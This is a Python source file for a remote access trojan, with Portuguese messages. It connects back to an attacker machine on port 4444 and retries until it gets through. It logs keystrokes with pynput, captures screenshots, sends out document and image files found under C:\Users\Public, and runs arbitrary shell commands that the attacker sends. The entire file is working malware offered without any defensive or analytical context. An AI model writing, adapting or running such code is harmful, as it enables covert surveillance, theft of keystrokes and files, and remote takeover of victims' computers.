import socket
import os
import subprocess
import threading
import pynput.keyboard
import pyautogui
import time

keylogs = []

def start_keylogger():
    def on_press(key):
        try:
            keylogs.append(str(key.char))
        except AttributeError:
            keylogs.append(str(key))
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()

def take_screenshot():
    filename = os.path.join(os.getenv("TEMP"), f"screenshot_{int(time.time())}.png")
    pyautogui.screenshot().save(filename)
    return filename

def exfiltrate_files(sock, base_dir="C:\\Users\\Public"):
    for root, dirs, files in os.walk(base_dir):
        for file in files:
            if file.endswith((".txt", ".docx", ".pdf", ".jpg")):
                full_path = os.path.join(root, file)
                try:
                    with open(full_path, "rb") as f:
                        content = f.read()
                    sock.send(f"EXFIL::{file}::{len(content)}".encode())
                    time.sleep(0.5)
                    sock.sendall(content)
                    time.sleep(0.5)
                except:
                    continue

def shel(sock):
    sock.send(b"[+] Shell pronta. Use comando:\n")
    while True:
        try:
            cmd = sock.recv(1024).decode().strip()
            if cmd == "exit":
                break
            elif cmd == "keylog":
                sock.send("".join(keylogs).encode())
            elif cmd == "screenshot":
                path = take_screenshot()
                with open(path, "rb") as f:
                    data = f.read()
                sock.send(f"SCREEN::{len(data)}".encode())
                time.sleep(0.5)
                sock.sendall(data)
            elif cmd == "exfil":
                sock.send(b"[+] Iniciando Exfiltracao...\n")
                exfiltrate_files(sock)
            else:
                output = subprocess.getoutput(cmd)
                sock.send(output.encode())
        except Exception as e:
            sock.send(f"[Erro] {e}".encode())

def connet():
    host = "192.xxx.x.xx" #IP DA SUA MAQUINA ATACANTE
    port = 4444
    while True:
        try:
            s = socket.socket()
            s.connect((host, port))
            start_keylogger()
            shel(s)
            s.close()
            break
        except:
            time.sleep(5)

connet()